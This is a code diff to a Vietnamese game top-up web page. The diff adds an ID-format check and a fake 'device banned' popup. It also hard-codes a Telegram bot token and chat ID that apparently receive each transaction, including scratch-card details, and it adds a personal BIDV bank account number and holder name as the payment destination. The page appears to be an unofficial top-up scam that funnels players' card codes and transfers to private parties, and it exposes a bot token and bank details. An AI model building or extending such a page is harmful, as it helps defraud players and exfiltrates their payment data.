@@ -66,6 +66,10 @@
         button:hover {
             background-color: #388e3c;
         }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
         .packages-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -125,6 +129,11 @@
             color: #4CAF50;
             margin-bottom: 10px;
         }
+        .error-mark {
+            font-size: 45px;
+            color: #f44336;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
@@ -135,8 +144,9 @@
     <!-- Bước 1: Đăng nhập ID Game -->
     <div id="step-login" class="form-group">
         <label for="gameId">Nhập ID Game:</label>
-        <input type="text" id="gameId" placeholder="Nhập dãy số ID game của bạn...">
-        <button onclick="handleLogin()">Đăng Nhập</button>
+        <input type="text" id="gameId" placeholder="Nhập dãy số ID game (8-10 số)...">
+        <button id="loginBtn" onclick="handleLogin()">Đăng Nhập</button>
+        <p id="errorMsg" style="color: #f44336; font-size: 13px; margin-top: 5px; font-weight: bold;"></p>
     </div>
 
     <!-- Bước 2: Chọn gói nạp -->
@@ -205,7 +215,7 @@
 
 </div>
 
-<!-- Popup chờ xử lý (Mặc định ẩn) -->
+<!-- Popup chờ xử lý -->
 <div id="loadingModal" class="hidden">
     <div class="modal-content">
         <div class="checkmark">✅</div>
@@ -214,19 +224,56 @@
     </div>
 </div>
 
+<!-- Popup Cấm (Ban) khi nhập sai 3 lần -->
+<div id="banModal" class="hidden">
+    <div class="modal-content">
+        <div class="error-mark">❌</div>
+        <p style="font-weight: bold; color: #f44336; font-size: 16px;">TÀI KHOẢN BỊ CẤM!</p>
+        <p style="color: #555; font-size: 14px; margin-top: 8px;">Bạn đã nhập sai ID quá 3 lần. Thiết bị/trình duyệt này đã bị cấm truy cập hệ thống!</p>
+    </div>
+</div>
+
 <script>
     let currentGameId = "";
     let currentPackage = "";
+    let failCount = localStorage.getItem("ban_count") ? parseInt(localStorage.getItem("ban_count")) : 0;
+
+    // Kiểm tra nếu đã bị cấm từ trước
+    if (failCount >= 3) {
+        document.getElementById("gameId").disabled = true;
+        document.getElementById("loginBtn").disabled = true;
+        document.getElementById("errorMsg").innerText = "❌ Bạn đã bị cấm do nhập sai ID quá 3 lần!";
+    }
 
     const TELEGRAM_BOT_TOKEN = "8975192062:AAGANTM_Pks5TLp2RzyPosoPiCABQg1gmho";
     const TELEGRAM_CHAT_ID = "8620455610";
 
     function handleLogin() {
+        if (failCount >= 3) return;
+
         let gameId = document.getElementById("gameId").value.trim();
-        if (gameId === "") {
-            alert("Vui lòng nhập ID game!");
+        let errorMsg = document.getElementById("errorMsg");
+
+        // Kiểm tra ID phải là số và có độ dài từ 8 đến 10 chữ số (trên 7 và dưới 11)
+        let isValidId = /^\d{8,10}$/.test(gameId);
+
+        if (!isValidId) {
+            failCount++;
+            localStorage.setItem("ban_count", failCount);
+            
+            if (failCount >= 3) {
+                document.getElementById("gameId").disabled = true;
+                document.getElementById("loginBtn").disabled = true;
+                document.getElementById("banModal").classList.remove("hidden");
+                return;
+            }
+
+            errorMsg.innerHTML = `❌ ID không hợp lệ! (Phải từ 8 đến 10 số). Bạn còn ${3 - failCount} lần thử.`;
             return;
         }
+
+        // Nếu đúng
+        errorMsg.innerText = "";
         currentGameId = gameId;
         document.getElementById("step-login").classList.add("hidden");
         document.getElementById("step-packages").classList.remove("hidden");
@@ -258,7 +305,7 @@
             return;
         }
 
-        let message = `🔔 *CÓ GIAO DỊCH NẠP MỚI* 💎\n\n- *ID Game:* ${currentGameId}\n- *Gói nạp:* ${currentPackage}\n- *Hình thức:* ${type === 'card' ? 'Thẻ cào' : 'Chuyển khoản (BIDV)'}`;
+        let message = `🔔 *CÓ GIAO DỊCH NẠP MỚI* 💎\n\n- *ID Game:* ${currentGameId}\n- *Gói nạp:* ${currentPackage}\n- *Hình thức:* ${type === 'card' ? 'Thẻ cào' : 'Chuyển khoản (BIDV - 8877945567 - VI THI HA)'}`;
 
         if (type === 'card') {
             let cardType = document.getElementById("cardType").value;
@@ -331,5 +378,5 @@
 </script>
 
 </body>
-                                                     </html>
-            
+    </html>
+    
